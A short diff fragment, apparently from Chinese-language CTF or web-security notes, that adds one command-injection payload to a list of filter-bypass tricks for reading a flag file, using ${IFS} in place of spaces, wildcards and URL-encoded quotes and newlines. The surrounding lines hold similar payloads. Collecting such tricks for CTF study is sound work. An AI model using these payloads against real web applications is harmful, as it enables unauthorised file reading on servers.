@@ -1805,6 +1805,8 @@ bin下的命令：[Linux /bin 目录下命令简要说明 - 崔旗 - 博客园](
 vi${IFS}fla?.php 
 or
 c=uniq${IFS}f???.php //倒序的
+or
+grep${IFS}%27fla%27${IFS}f???????%0a
 ```
 
 
